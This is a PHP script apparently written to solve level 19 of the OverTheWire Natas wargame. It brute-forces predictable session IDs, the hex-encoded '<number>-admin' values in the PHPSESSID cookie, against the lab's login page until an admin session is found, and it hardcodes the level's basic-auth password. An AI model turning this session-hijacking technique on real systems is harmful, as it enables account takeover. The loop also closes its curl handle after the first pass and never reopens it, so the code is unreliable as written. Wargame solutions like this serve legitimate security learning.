<?php
include_once "./functions.php";
$url = "http://natas19.natas.labs.overthewire.org/index.php?debug=true";
$ch = curl_init ($url);
$headers   = array();
function ascii2hex($ascii) 
{
    $hex = '';
    for ($i = 0; $i < strlen($ascii); $i++) {
      $byte = strtoupper(dechex(ord($ascii[$i])));
      $byte = str_repeat('0', 2 - strlen($byte)).$byte;
      $hex.=$byte;
    }
    $hex = strtolower($hex);
    return $hex;
}
$found = false;
for ($i=0; $i < 649; $i++) { 
    $currentSessionId = ascii2hex($i."-admin");
    curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=' . $currentSessionId);
    curl_setopt($ch, CURLOPT_USERPWD,"natas19:8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s");  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_POSTFIELDS, "username=admin&password=admin");
    $output = curl_exec ($ch);
    curl_close($ch);
    echo "trying with {$i}...";
    echo "\n";
    if(strpos($output,"You are an admin.") !== false)
    {
        echo get_string_between($output,"<pre>","</pre>");
        $found = true;
    }
    if($found){
        break;
    }
}
?>